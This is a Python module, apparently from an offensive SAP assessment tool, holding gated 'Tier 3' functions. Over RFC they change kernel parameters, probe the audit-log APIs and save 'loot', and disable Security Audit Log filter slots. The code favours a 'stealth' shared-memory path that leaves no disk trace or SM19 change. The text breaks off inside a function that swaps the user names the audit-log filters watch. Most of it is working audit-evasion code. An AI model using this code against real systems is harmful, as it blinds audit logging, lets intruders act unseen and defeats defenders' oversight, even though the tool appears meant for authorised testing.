"""Tier 3 active-manipulation entry points.

This module hosts one entry function per registered Tier 3 technique
(``sapmap_evasion_gate.TIER3_TECHNIQUES``).  Every entry:

  1. Asserts the operator-armed gate
     (``assert_evasion_allowed``) — refuses with ``EvasionGateError``
     otherwise.
  2. Captures a baseline snapshot if none exists.
  3. Runs the body under ``evasion_window`` so restore-on-exit is
     wired correctly.
  4. Mutates the kernel via ``change_param`` (``TH_CHANGE_PARAMETER``,
     RFC-enabled, dynamic, in-memory only).
  5. ``evasion_window`` restores the baseline value on exit (including
     exception path) by calling ``restore_baseline`` which also uses
     ``TH_CHANGE_PARAMETER`` under the hood.

Entry-point signature for every technique::

    tier3_<name>(state, node, **params) -> dict

returning ``{ok, technique, applied, baseline_value, snapshot_loot,
error}``.
"""

from __future__ import annotations

import logging
from typing import Optional

from sapmap_evasion_baseline import (capture_baseline, change_param,
                                       evasion_window,
                                       write_dyn_profile,
                                       read_legacy_sal_config,
                                       write_legacy_sal_config)
from sapmap_evasion_gate import (assert_evasion_allowed,
                                   EvasionGateError, technique_label)

logger = logging.getLogger(__name__)


def _wrap_result(technique: str, ok: bool, **extra) -> dict:
    out = {"ok": ok, "technique": technique,
            "label": technique_label(technique)}
    out.update(extra)
    return out


def _read_param_live(node, creds, name: str) -> str:
    """Single TH_GET_PARAMETER read.  Returns the live runtime value
    or "" on failure (the caller decides what an empty read means)."""
    import sapmap_rfc
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            r = conn.call("TH_GET_PARAMETER", PARAMETER_NAME=name)
            v = (r.get("PARAMETER_VALUE")
                  or r.get("VALUE")
                  or r.get("RETURN_VALUE") or "")
            if isinstance(v, bytes):
                v = v.decode("utf-8", errors="replace")
            return str(v).strip()
    except Exception:
        return ""


def tier3_set_param(state, node, param: str, value: str,
                     hold_seconds: float = 0.0,
                     creds=None) -> dict:
    """4.A.2 / 4.C.4 — dynamic kernel-parameter set via TH_CHANGE_PARAMETER.

    Asserts the gate, captures a baseline, then writes ``param=value``
    via the RFC-enabled FM ``TH_CHANGE_PARAMETER`` inside an evasion
    window so the captured baseline value is automatically restored on
    exit (or on exception).

    After the write, the runtime value is re-read via ``TH_GET_PARAMETER``
    so the operator gets ground truth on whether the kernel actually
    committed the change (some compound params and some kernels return
    RC=0 from the writer even when the value was rejected silently).

    When ``hold_seconds > 0`` the function sleeps before exiting the
    evasion window so the operator can verify the mutated value in
    RZ11 / SM50 during the hold.  Without a hold the window restores
    the baseline within milliseconds and the live value will never
    appear changed in RZ11.

    The change is in-memory only — no profile file rewrite, no kernel
    restart, no AUM/AUW SAL events.
    """
    import time as _time
    technique = "rz11_dynamic_set"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return _wrap_result(
            technique, False,
            error="baseline capture returned empty; refusing to mutate",
            applied=False)

    original = snap.params.get(param)
    if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
        return _wrap_result(
            technique, False,
            error=f"{param} could not be baseline-captured "
                   f"({original.split(':', 1)[-1].strip()}); refusing",
            applied=False)

    write_result = {"ok": False, "error": "not attempted"}
    live_after_write = ""
    live_after_restore = ""
    try:
        with evasion_window(node, state, technique,
                             creds=creds,
                             touched_params=[param]):
            write_result = change_param(node, creds, param, value)
            if write_result["ok"]:
                print(f"[+] {snap.sid}: TH_CHANGE_PARAMETER — "
                      f"{param}={value!r} (baseline {param}={original!r})")
                # Verify-read so we know whether the kernel actually
                # committed.  If the live value still equals the
                # baseline, the writer call was a silent no-op (which
                # is the symptom that triggered this whole investigation
                # — some kernels accept the call with RC=0 but skip
                # the commit on certain CHECK_PARAMETER values).
                live_after_write = _read_param_live(node, creds, param)
                if live_after_write == str(value):
                    print(f"[+] {snap.sid}: verify-read — "
                          f"{param}={live_after_write!r} (commit "
                          f"confirmed)")
                else:
                    print(f"[!] {snap.sid}: verify-read — "
                          f"{param}={live_after_write!r} (expected "
                          f"{value!r}; writer call returned RC=0 but "
                          f"the kernel did NOT commit the change — "
                          f"the change is being silently rejected)")
                if hold_seconds > 0:
                    print(f"[*] {snap.sid}: holding {param}={value!r} "
                          f"for {hold_seconds}s — check RZ11 now")
                    _time.sleep(max(0.0, float(hold_seconds)))
            else:
                print(f"[-] {snap.sid}: TH_CHANGE_PARAMETER failed — "
                      f"{param}={value!r}: {write_result['error']}")
        # evasion_window has exited at this point — restore should
        # have fired.  Verify again so we see whether the kernel really
        # rolled back to baseline.
        if write_result["ok"]:
            live_after_restore = _read_param_live(node, creds, param)
            if live_after_restore == str(original):
                print(f"[+] {snap.sid}: post-restore verify — "
                      f"{param}={live_after_restore!r} (baseline)")
            else:
                print(f"[!] {snap.sid}: post-restore verify — "
                      f"{param}={live_after_restore!r} (expected "
                      f"baseline {original!r}; restore did NOT commit "
                      f"— operator must manually reset via RZ11)")
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    # Surface verify-read results so the GUI can flag a silent-no-op.
    applied = (write_result["ok"]
                and (live_after_write == str(value)
                     or live_after_write == ""))
    err = write_result["error"] if not write_result["ok"] else ""
    if (write_result["ok"] and live_after_write
            and live_after_write != str(value)):
        err = (f"writer returned RC=0 but verify-read shows "
                f"{param}={live_after_write!r}, not {value!r}")
    return _wrap_result(
        technique, write_result["ok"],
        param=param, requested_value=value,
        baseline_value=original,
        live_after_write=live_after_write,
        live_after_restore=live_after_restore,
        applied=applied,
        error=err,
        snapshot_loot=snap.loot_path)


def probe_rsau_api_surface(state, node, creds=None,
                             loot_root: str = "loot") -> dict:
    """Phase 2 — read-only discovery probe for the RSAU API surface.

    Calls ``FUNCTION_EXISTS`` + ``RFC_GET_FUNCTION_INTERFACE`` for the
    candidate write/read FMs we may need in Phase 3.  Pure metadata
    read; nothing in the SAL config is touched.

    The output gives us:
      * which FMs are actually exposed on this kernel
      * the exact IMPORT / EXPORT / CHANGING / TABLES parameter
        signatures so we can call them correctly the first time
        instead of guessing names + shapes

    Result is also written to
    ``loot/baseline/<sid>/rsau_api_probe_<ts>.json`` for off-line
    review and reproducibility.
    """
    technique = "rz11_dynamic_set"   # gate-only — no kernel mutation
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "probe_rsau_api",
                "error": str(e), "functions": []}

    import json as _json
    from pathlib import Path as _Path
    from datetime import datetime as _dt
    import sapmap_rfc
    from sapmap_errors import format_rfc_exception

    # Candidate FMs we want to confirm exist + read signatures of.
    # Order is the order the operator will see in the finding stream.
    candidates = (
        # Known to exist on this S/4 (confirmed in Phase 1 lab run)
        "RSAU_API_GET_AUDIT_CONFIG",
        # Operator-confirmed in SE37 screenshots — the two write FMs
        "RSAU_API_SET_PROFILE",
        "RSAU_API_SET_PARAM",
        # Expected symmetric reads — exist in operator's SAP install?
        "RSAU_API_GET_PROFILE",
        "RSAU_API_GET_PARAM",
        # Older variant from earlier screenshot
        "RSAU_UPD_AUDIT_CONFIG",
        # Less likely but worth checking — different naming style
        "RSAU_API_DEL_PROFILE",
        "RSAU_API_GET_FILT",
        "RSAU_API_SET_FILT",
    )

    results = []
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            for fm in candidates:
                results.append(_probe_one_fm(conn, fm,
                                              format_rfc_exception))
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "technique": "probe_rsau_api",
                "error": f"connect failed: {msg}", "functions": []}

    sid = getattr(node, "sid", "?")
    probed_at = _dt.now().isoformat()
    loot_path = ""
    try:
        loot_dir = _Path(loot_root) / "baseline" / sid
        loot_dir.mkdir(parents=True, exist_ok=True)
        fname = ("rsau_api_probe_"
                 + probed_at.replace(":", "").replace(".", "_")
                 + ".json")
        loot_path = str(loot_dir / fname)
        _Path(loot_path).write_text(_json.dumps({
            "sid": sid, "probed_at": probed_at,
            "functions": results,
            "loot_path": loot_path,
        }, indent=2))
    except Exception as e:
        logger.warning(f"{sid}: rsau probe loot write failed: {e}")

    # Per-FM one-line summary, plus an overall INFO finding the
    # operator sees in the panel.
    try:
        from sapmap_findings import emit_finding
        for r in results:
            if r["exists"]:
                params_summary = _summarise_params(r["params"])
                emit_finding("INFO", sid,
                              f"RSAU API probe: {r['name']} exists — "
                              f"{params_summary}")
            else:
                emit_finding("INFO", sid,
                              f"RSAU API probe: {r['name']} ABSENT "
                              f"({r['error'][:80]})")
    except Exception:
        pass

    n_exist = sum(1 for r in results if r["exists"])
    return {"ok": True, "technique": "probe_rsau_api",
            "sid": sid, "probed_at": probed_at,
            "functions": results,
            "found_count": n_exist,
            "total_checked": len(results),
            "loot_path": loot_path}


def _probe_one_fm(conn, fm: str, format_exc) -> dict:
    """Probe a single FM via FUNCTION_EXISTS + RFC_GET_FUNCTION_INTERFACE.

    Returns ``{name, exists, error, params}`` where params is a list of
    ``{parameter, direction, datatype, optional, structure_name}``
    dicts.  ``direction`` is one of ``IMPORT`` / ``EXPORT`` /
    ``CHANGING`` / ``TABLES`` / ``EXCEPTION`` (mapped from the
    SAP-side ``PARAMTYPE`` letter ``I/E/C/T/X``).
    """
    out = {"name": fm, "exists": False, "error": "", "params": []}

    try:
        conn.call("FUNCTION_EXISTS", FUNCNAME=fm)
        out["exists"] = True
    except Exception as e:
        msg = format_exc(e).split("\n")[0][:200]
        if "FU_NOT_FOUND" in msg or "FUNCTION_NOT_FOUND" in msg:
            out["error"] = "FU_NOT_FOUND"
        else:
            out["error"] = msg
        return out

    # FM exists — pull its parameter list.
    try:
        r = conn.call("RFC_GET_FUNCTION_INTERFACE", FUNCNAME=fm)
    except Exception as e:
        out["error"] = ("signature read failed: "
                         + format_exc(e).split("\n")[0][:160])
        return out

    # PARAMS table is RFC_FUNC_DESC.  Field names (verified on
    # S/4 793 — earlier guesses at PARAMTYPE / FUNCTYPE / STRUCTURE
    # came back empty because those are not the real field names):
    #   PARAMCLASS — I=Import, E=Export, C=Changing, T=Tables, X=Exception
    #   EXID       — external type letter (C, N, X, I, F, D, T, g, h, u, ...)
    #   TABNAME    — type or structure reference name
    #   FIELDNAME  — field name when a single field is referenced
    direction_map = {"I": "IMPORT", "E": "EXPORT", "C": "CHANGING",
                      "T": "TABLES", "X": "EXCEPTION"}
    for row in r.get("PARAMS", []) or []:
        pclass = (row.get("PARAMCLASS")
                  or row.get("PARAMTYPE") or "").strip()
        out["params"].append({
            "parameter": (row.get("PARAMETER") or "").strip(),
            "direction": direction_map.get(pclass, pclass or "?"),
            "datatype": (row.get("EXID")
                          or row.get("FUNCTYPE")
                          or row.get("EXTYP") or "").strip(),
            "structure": (row.get("TABNAME")
                           or row.get("STRUCTURE")
                           or row.get("REFERENCE") or "").strip(),
            "fieldname": (row.get("FIELDNAME") or "").strip(),
            "optional": (row.get("OPTIONAL") or "").strip() == "X",
            "default": (row.get("DEFAULT") or "").strip(),
            "text": (row.get("PARAMTEXT") or "").strip(),
        })
    return out


def _summarise_params(params: list) -> str:
    """One-line summary of an FM's signature for the finding text."""
    by_dir = {"IMPORT": [], "EXPORT": [], "CHANGING": [],
              "TABLES": [], "EXCEPTION": []}
    for p in params:
        d = p.get("direction", "?")
        if d in by_dir:
            by_dir[d].append(p["parameter"])
    parts = []
    for d in ("IMPORT", "EXPORT", "CHANGING", "TABLES"):
        if by_dir[d]:
            parts.append(f"{d[0]}=[{','.join(by_dir[d])}]")
    return " ".join(parts) if parts else "no params"


def read_dyn_profile(node, creds=None,
                       profile_name: str = "") -> dict:
    """Phase 3 step 1 — call ``RSAU_API_GET_PROFILE`` and return the
    verbatim response.

    Symmetric read counterpart to ``RSAU_API_SET_PROFILE``:
    ``ET_FILT`` rows we read here have the exact same ``RSAUPROF_T``
    row type as the ``IT_FILT`` parameter we'll later send back for
    restore.  So caching this response + sending it back unchanged
    is the cleanest possible baseline restore primitive — no
    interpretation, no field reshaping, no risk of mis-reading the
    kernel's internal slot layout.

    Args:
        profile_name: ABAP profile name.  Empty (default) → read the
            *dynamic* in-memory profile (``ID_DYN_CONF='X'``, no
            ``ID_NAME``).  Non-empty → read that specific profile by
            name (``ID_NAME=<name>``, no ``ID_DYN_CONF``).

    The kernel treats ``ID_NAME``, ``ID_DYN_CONF`` and ``ID_CURR_PROF``
    as **mutually exclusive actions** (passing more than one raises
    SECAUDIT 058 "Only one action is permitted" via ET_LOG).  This
    helper picks one based on whether ``profile_name`` was supplied.

    Returns the response dict verbatim (keys ``ED_DATA_STR``,
    ``ET_FILT``, ``ET_FILTEX``, ``ET_TEXT``, ``ET_LOG``).  Raises on
    RFC error; the caller checks ``ET_LOG`` for SECAUDIT errors the
    kernel surfaces in-band rather than as exceptions.
    """
    import sapmap_rfc
    kwargs = ({"ID_NAME": profile_name} if profile_name
              else {"ID_DYN_CONF": "X"})
    with sapmap_rfc._get_connection(node, creds) as conn:
        return conn.call("RSAU_API_GET_PROFILE", **kwargs)


def _et_log_errors(et_log) -> list:
    """Return the subset of ET_LOG rows the kernel marked as errors.

    RSAU_* FMs surface failures in-band: the RFC call returns RC=0
    but ET_LOG contains BAPIRET2 rows with TYPE='E' (or 'A' for
    abort).  Callers should treat any non-empty error list as a
    failed call even when no Python exception was raised.
    """
    return [row for row in (et_log or [])
            if (row.get("TYPE") or "").upper() in ("E", "A", "X")]


def tier3_probe_dyn_profile(state, node, creds=None,
                              profile_name: str = "",
                              loot_root: str = "loot") -> dict:
    """Phase 3 step 1 entry point — read-only probe of the dynamic
    audit profile.

    Calls ``RSAU_API_GET_PROFILE(ID_NAME='$DYN$', ID_DYN_CONF='X')``
    and dumps the verbatim response to
    ``loot/baseline/<sid>/dyn_profile_<ts>.json``.  Pure read; no
    mutation.  Gated behind ``--allow-evasion`` because the response
    shape is only useful when Tier 3 is armed and we're about to
    plan a write against it.
    """
    technique = "rz11_dynamic_set"   # gate-only — no kernel mutation
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "probe_dyn_profile",
                "error": str(e), "profile_name": profile_name}

    import json as _json
    from pathlib import Path as _Path
    from datetime import datetime as _dt
    from sapmap_errors import format_rfc_exception

    sid = getattr(node, "sid", "?")
    probed_at = _dt.now().isoformat()

    try:
        resp = read_dyn_profile(node, creds=creds,
                                 profile_name=profile_name)
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "technique": "probe_dyn_profile",
                "error": f"RSAU_API_GET_PROFILE raised: {msg}",
                "profile_name": profile_name}

    # ABAP byte / RAWSTRING values may come back as Python bytes —
    # JSON can't carry them.  Hex-encode anything that looks binary
    # so the loot file is plain UTF-8.
    def _norm(v):
        if isinstance(v, bytes):
            return v.hex()
        if isinstance(v, dict):
            return {k: _norm(x) for k, x in v.items()}
        if isinstance(v, list):
            return [_norm(x) for x in v]
        return v
    normalised = {k: _norm(v) for k, v in resp.items()}

    et_filt = normalised.get("ET_FILT") or []
    et_filtex = normalised.get("ET_FILTEX") or []
    et_text = normalised.get("ET_TEXT") or []
    et_log = normalised.get("ET_LOG") or []

    # In-band error check.  RSAU_* FMs return RC=0 even on auth or
    # parameter failures; the real status lives in ET_LOG.  An
    # earlier lab probe (with both ID_NAME and ID_DYN_CONF supplied)
    # surfaced SECAUDIT 058 "Only one action is permitted" here.
    log_errors = _et_log_errors(et_log)

    loot_path = ""
    try:
        loot_dir = _Path(loot_root) / "baseline" / sid
        loot_dir.mkdir(parents=True, exist_ok=True)
        fname = ("dyn_profile_"
                 + probed_at.replace(":", "").replace(".", "_")
                 + ".json")
        loot_path = str(loot_dir / fname)
        _Path(loot_path).write_text(_json.dumps({
            "sid": sid,
            "probed_at": probed_at,
            "profile_name": profile_name,
            "response": normalised,
            "loot_path": loot_path,
        }, indent=2))
    except Exception as e:
        logger.warning(f"{sid}: dyn profile loot write failed: {e}")

    # Surface a finding so the operator sees the shape summary in the
    # panel without having to open the JSON.  First-row keys are the
    # field names; we list them so we know what RSAUPROF actually
    # contains on this kernel before the writer is built.
    first_row_keys = sorted((et_filt[0] or {}).keys()) if et_filt else []
    err_summary = ""
    if log_errors:
        msgs = "; ".join(
            f"{r.get('ID','')} {r.get('NUMBER','')} "
            f"{r.get('MESSAGE','')[:80]}"
            for r in log_errors[:3])
        err_summary = f" — KERNEL ERRORS: {msgs}"
    try:
        from sapmap_findings import emit_finding
        sev = "WARNING" if log_errors else "INFO"
        emit_finding(
            sev, sid,
            f"RSAU dyn-profile probe ({profile_name or 'dyn'}): "
            f"ET_FILT={len(et_filt)} row(s), "
            f"ET_FILTEX={len(et_filtex)}, ET_TEXT={len(et_text)}, "
            f"ET_LOG={len(et_log)}; RSAUPROF row fields: "
            f"{','.join(first_row_keys) if first_row_keys else '(empty)'}"
            f"{err_summary}")
    except Exception:
        pass

    return {"ok": not log_errors,
            "technique": "probe_dyn_profile",
            "sid": sid,
            "probed_at": probed_at,
            "profile_name": profile_name or "(dyn)",
            "et_filt_count": len(et_filt),
            "et_filtex_count": len(et_filtex),
            "et_text_count": len(et_text),
            "et_log_count": len(et_log),
            "et_log_errors": log_errors,
            "rsauprof_row_fields": first_row_keys,
            "error": (f"kernel returned {len(log_errors)} error(s) "
                       f"in ET_LOG: {log_errors[0].get('MESSAGE','')}"
                       if log_errors else ""),
            "loot_path": loot_path}


def _normalize_slotnos(slotno_input, all_rows) -> list:
    """Resolve an operator-supplied slot identifier into a list of
    canonical 4-digit slot strings present in the dyn-profile rows.

    Accepted input shapes:
      - ``"1"`` / ``"0001"`` / ``1`` → ``["0001"]``
      - ``"1,2,3"`` / ``"0001,0002"`` → list of zero-padded entries
      - ``["1", 2, "0003"]`` (list/tuple/set) → list of zero-padded
      - ``"ALL"`` (case-insensitive) → every currently-active slot
        (``STATUS='X'``) in ``all_rows``.  Inactive placeholder slots
        are excluded so the operator doesn't accidentally write
        STATUS=' ' onto already-empty rows.
      - empty / blank → ``[]``
    """
    if isinstance(slotno_input, (list, tuple, set)):
        return [str(s).strip().zfill(4)
                for s in slotno_input
                if str(s).strip()]
    s = str(slotno_input or "").strip()
    if not s:
        return []
    if s.upper() == "ALL":
        return [str(r.get("SLOTNO", "")).strip().zfill(4)
                for r in all_rows or []
                if str(r.get("STATUS", "")).strip() == "X"]
    if "," in s:
        return [p.strip().zfill(4)
                for p in s.split(",") if p.strip()]
    return [s.zfill(4)]


def _try_stealth_sal_slot_disable(state, node, sid, slotno,
                                   hold_seconds, creds,
                                   technique) -> Optional[dict]:
    """Attempt SAL slot disable via RSAU_UPD_AUDIT_CONFIG (SHM-only).

    Returns ``None`` if the legacy FMs aren't available on this kernel
    (caller should fall back to the RSAU_API_SET_PROFILE path).
    Returns a result dict if the stealth path was attempted.
    """
    import time as _time
    import sapmap_rfc

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            probe = read_legacy_sal_config(conn)
    except Exception:
        return None
    if not probe["ok"] or not probe["slotinfo"]:
        return None

    with evasion_window(node, state, technique, creds=creds,
                         touched_params=[],
                         touched_dyn_profile=False) as frame:
        snap = frame["snapshot"]

        with sapmap_rfc._get_connection(node, creds) as conn:
            fresh = read_legacy_sal_config(conn)
            if not fresh["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=f"fresh legacy read failed: {fresh['error']}")

            rows = fresh["slotinfo"]
            baseline_rows = [dict(r) for r in rows]

            augmented = [{**r, "SLOTNO": str(i + 1).zfill(4)}
                         for i, r in enumerate(rows)]
            target_slots = _normalize_slotnos(slotno, augmented)
            if not target_slots:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error="no target slots resolved")

            max_slot = len(rows)
            for s in target_slots:
                idx = int(s) - 1
                if idx < 0 or idx >= max_slot:
                    return _wrap_result(
                        technique, False,
                        slotno=",".join(target_slots),
                        hold_seconds=hold_seconds,
                        error=f"slot {s} out of range (max {max_slot})")

            baseline_statuses = {}
            active_before = 0
            for s in target_slots:
                st = str(rows[int(s) - 1].get("STATUS", "")).strip() or " "
                baseline_statuses[s] = st
            for r in rows:
                if str(r.get("STATUS", "")).strip() == "X":
                    active_before += 1

            target_indices = {int(s) - 1 for s in target_slots}
            mutated = [dict(r) for r in rows]
            for idx in target_indices:
                mutated[idx]["STATUS"] = " "

            print(f"[*] {sid}: SAL slot disable (stealth/SHM) — targets "
                  f"{','.join(target_slots)} (baseline {baseline_statuses}); "
                  f"{active_before}/{len(rows)} active")

            w = write_legacy_sal_config(conn, mutated, enable="-")
            if not w["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    baseline_statuses=baseline_statuses,
                    before_active_count=active_before,
                    error=f"stealth write failed: {w['error']}")

            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
                  f"disabled (SHM-only) — holding {hold_seconds}s")

        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                f"disabled via RSAU_UPD_AUDIT_CONFIG "
                f"(shared-memory only — no disk persistence, no SM19 "
                f"header change)")
        except Exception:
            pass

        try:
            _time.sleep(max(0.0, float(hold_seconds)))
        finally:
            print(f"[*] {sid}: restoring SAL slots (stealth/SHM)...")
            try:
                with sapmap_rfc._get_connection(node, creds) as conn:
                    r = write_legacy_sal_config(conn, baseline_rows,
                                                 enable="-")
                    if r["ok"]:
                        print(f"[+] {sid}: SAL slots restored "
                              f"(SHM-only, no disk trace)")
                    else:
                        print(f"[!] {sid}: stealth restore failed: "
                              f"{r['error']}")
            except Exception as re:
                print(f"[!] {sid}: stealth restore exception: {re}")

    try:
        from sapmap_findings import emit_finding
        emit_finding("INFO", sid,
                     f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                     f"restored (stealth — no disk trace)")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        slotno=",".join(target_slots),
        hold_seconds=hold_seconds,
        baseline_statuses=baseline_statuses,
        before_active_count=active_before,
        after_restore="stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only)",
        stealth_mode=True)


def tier3_sal_slot_disable(state, node, slotno,
                              profile_name: str = "",
                              hold_seconds: float = 5.0,
                              creds=None) -> dict:
    """Disable one or more SAL filter slots for *hold_seconds*, then restore.

    Two writer paths, tried in order:

      **Stealth (primary):** ``RSAU_UPD_AUDIT_CONFIG`` — writes to
      kernel shared memory only.  No disk persistence, no profile-name
      header change, no "Last changed by" timestamp in SM19.

      **Fallback:** ``RSAU_API_SET_PROFILE`` — also persists the
      static profile to disk (SM19 shows "Last changed by SAPMAP00").
      Only used if the legacy FMs aren't available on the kernel.

    Args:
        slotno: ``"1"``, ``"1,2,3"``, list, or ``"ALL"``.
        profile_name: only needed for the fallback writer path.
        hold_seconds: how long to keep slots disabled before restore.
    """
    import time as _time
    technique = "sal_filter_narrow"
    try:
        assert_evasion_allowed(state, node, technique)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)

    sid = getattr(node, "sid", "?")
    explicit_name = (profile_name or "").strip()

    # Primary path: stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only, no
    # disk persistence, no SM19 header change).  Falls back to the
    # RSAU_API_SET_PROFILE path below if the legacy FMs are missing.
    try:
        stealth = _try_stealth_sal_slot_disable(
            state, node, sid, slotno, hold_seconds, creds, technique)
        if stealth is not None:
            return stealth
    except EvasionGateError:
        raise
    except Exception as e:
        logger.debug(f"{sid}: stealth path unavailable, falling back "
                     f"to API path: {e}")

    # Fallback: RSAU_API_SET_PROFILE (also persists static profile to disk).
    if not explicit_name:
        return _wrap_result(
            technique, False,
            slotno=str(slotno), hold_seconds=hold_seconds,
            error=("SAL profile name required for fallback writer — "
                   "pass profile_name (RSAU_CONFIG 'Current Profile/"
                   "Filter: <NAME>/NN'; e.g. 'SAPSEC')"))
    try:
        # touched_params=[] explicitly opts OUT of the param restore
        # loop — this technique only mutates the dyn profile, so
        # restoring every captured TH_GET_PARAMETER value on window
        # exit would (a) be wrong and (b) spam NOT_CHANGEABLE errors
        # for the rsau/* / rec/* / stat/* static params.
        with evasion_window(node, state, technique, creds=creds,
                             touched_params=[],
                             touched_dyn_profile=True) as frame:
            snap = frame["snapshot"]
            effective_name = (explicit_name
                              or snap.sal_profile_name)
            if not effective_name:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=("SAL profile name required — pass "
                           "profile_name (visible in RSAU_CONFIG as "
                           "'Current Profile/Filter: <NAME>/NN'; "
                           "e.g. 'SAPSEC' on stock S/4)"))
            if explicit_name and not snap.sal_profile_name:
                snap.sal_profile_name = explicit_name
            # Read fresh — never mutate from a stale baseline.
            current = read_dyn_profile(node, creds=creds)
            log_errors = _et_log_errors(current.get("ET_LOG"))
            if log_errors:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=(f"fresh read failed: "
                            f"{log_errors[0].get('MESSAGE','')}"))

            et_filt = list(current.get("ET_FILT") or [])
            et_filtex = list(current.get("ET_FILTEX") or [])
            et_text = list(current.get("ET_TEXT") or [])

            # Resolve slot list — single, comma-separated, list, or "ALL"
            target_slots = _normalize_slotnos(slotno, et_filt)
            if not target_slots:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=("no target slots resolved — "
                            "supply a slot number, '1,2,3' list, or 'ALL'"))

            # Cross-check every requested slot is present in the
            # current dyn profile and capture baseline status.
            slot_lookup = {
                str(r.get("SLOTNO", "")).strip().zfill(4): r
                for r in et_filt}
            missing = [s for s in target_slots if s not in slot_lookup]
            if missing:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    error=(f"slots not present in dyn profile: "
                            f"{','.join(missing)}"))
            baseline_statuses = {
                s: (str(slot_lookup[s].get("STATUS", "")).strip() or " ")
                for s in target_slots}
            active_before = sum(
                1 for r in et_filt
                if str(r.get("STATUS", "")).strip() == "X")

            target_set = set(target_slots)
            print(f"[*] {sid}: SAL slot disable — targets "
                  f"{','.join(target_slots)} (baseline statuses "
                  f"{baseline_statuses}); {active_before} of "
                  f"{len(et_filt)} slot(s) currently active")

            # Mutate — copy rows, flip STATUS on every targeted row.
            mutated_filt = []
            for r in et_filt:
                copy = dict(r)
                key = str(copy.get("SLOTNO", "")).strip().zfill(4)
                if key in target_set:
                    copy["STATUS"] = " "
                mutated_filt.append(copy)

            w = write_dyn_profile(node, creds, effective_name,
                                    mutated_filt, et_filtex, et_text)
            if not w["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    baseline_statuses=baseline_statuses,
                    before_active_count=active_before,
                    error=f"write failed: {w['error']}")

            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
                  f"disabled — holding {hold_seconds}s before restore")
            try:
                from sapmap_findings import emit_finding
                # Stealth caveat — confirmed on S/4 793 lab: the
                # RSAU_API_SET_PROFILE call paired with ID_NAME=
                # <static profile name> persists the change through
                # to disk too.  The static profile's "Last changed
                # by" timestamp + user fields update visibly in
                # SM19.  Surface that to the operator so this isn't
                # mistaken for a fully invisible mutation.
                emit_finding(
                    "WARNING", sid,
                    f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                    f"disabled (STATUS X→' ') for {hold_seconds}s "
                    f"window — verify in SM19 / RSAU_CONFIG. "
                    f"NOTE: this writer also updates the persisted "
                    f"static profile '{effective_name}' on disk "
                    f"(visible as 'Last changed by SAPMAP00' in "
                    f"SM19 header).  Not a stealth-clean primitive "
                    f"on this kernel.")
            except Exception:
                pass

            _time.sleep(max(0.0, float(hold_seconds)))

        # Window exit ran restore automatically — log here so the
        # operator sees the round-trip completion clearly.
        print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
              f"restored — window closed cleanly")
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                f"restored to baseline")
        except Exception:
            pass
        return _wrap_result(
            technique, True,
            slotno=",".join(target_slots),
            hold_seconds=hold_seconds,
            baseline_statuses=baseline_statuses,
            before_active_count=active_before,
            after_restore="auto via evasion_window",
            stealth_warning=(
                f"static profile '{effective_name}' "
                "persisted on disk; SM19 header shows operator "
                "user/timestamp"))
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)
    except Exception as e:
        return _wrap_result(
            technique, False, error=f"unexpected: {e!r}",
            slotno=str(slotno), hold_seconds=hold_seconds)


def _try_stealth_sal_uname_narrow(state, node, sid, slotno,
                                    replacement_uname, hold_seconds,
                                    creds, technique) -> Optional[dict]:
    """Stealth path for SAL slot UNAME swap via RSAU_UPD_AUDIT_CONFIG.

    Returns ``None`` if legacy FMs aren't available (caller falls back).
    On success the targeted slots' UNAME is replaced with
    ``replacement_uname`` for ``hold_seconds`` and the baseline UNAME is
    restored on exit (or on exception).
    """
    import time as _time
    import sapmap_rfc

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            probe = read_legacy_sal_config(conn)
    except Exception:
        return None
    if not probe["ok"] or not probe["slotinfo"]:
        return None

    with evasion_window(node, state, technique, creds=creds,
                         touched_params=[],
                         touched_dyn_profile=False):
        with sapmap_rfc._get_connection(node, creds) as conn:
            fresh = read_legacy_sal_config(conn)
            if not fresh["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
